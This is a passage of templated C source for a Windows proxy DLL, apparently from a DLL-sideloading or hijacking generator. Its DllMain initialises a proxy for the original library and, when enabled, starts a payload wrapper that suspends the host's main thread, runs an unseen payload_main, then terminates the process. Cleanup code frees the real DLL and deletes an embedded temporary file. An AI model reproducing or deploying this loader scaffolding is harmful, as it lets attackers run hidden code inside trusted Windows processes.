{% if payload_enabled and block_enabled %}
/*
 * Wrapper that freezes the main thread so the process can't exit,
 * then runs the payload. When payload finishes, terminates the process.
 * If main reaches atexit first, the fallback wait keeps it alive instead.
 */
static DWORD WINAPI payload_wrapper(LPVOID lpParam) {
    if (hMainThread) {
        SuspendThread(hMainThread);
    }

    payload_main(lpParam);

    SetEvent(hPayloadDone);
    ExitProcess(0);
    return 0;
}

/* Fallback: if main exits before payload can suspend it */
static void wait_for_payload(void) {
    if (hPayloadDone) {
        WaitForSingleObject(hPayloadDone, INFINITE);
    }
}
{% endif %}

/* --- Cleanup --- */
static void cleanup_proxy(void) {
{% if payload_enabled %}
    if (hPayloadThread != NULL) {
        CloseHandle(hPayloadThread);
        hPayloadThread = NULL;
    }
{% if block_enabled %}
    if (hMainThread != NULL) {
        CloseHandle(hMainThread);
        hMainThread = NULL;
    }
    if (hPayloadDone != NULL) {
        CloseHandle(hPayloadDone);
        hPayloadDone = NULL;
    }
{% endif %}
{% endif %}
    if (hOriginalDll) {
        FreeLibrary(hOriginalDll);
        hOriginalDll = NULL;
    }
{% if embed_enabled %}
    if (szTempPath[0] != '\0') {
        DeleteFileA(szTempPath);
    }
{% endif %}
}

/* --- DLL Entry Point --- */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    (void)lpReserved;
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        hSelf = hinstDLL;
        DisableThreadLibraryCalls(hinstDLL);
        init_proxy();
{% if payload_enabled and block_enabled %}
        atexit(wait_for_payload);
{% endif %}
        break;
    case DLL_PROCESS_DETACH:
        cleanup_proxy();
        break;
    }
    return TRUE;
}
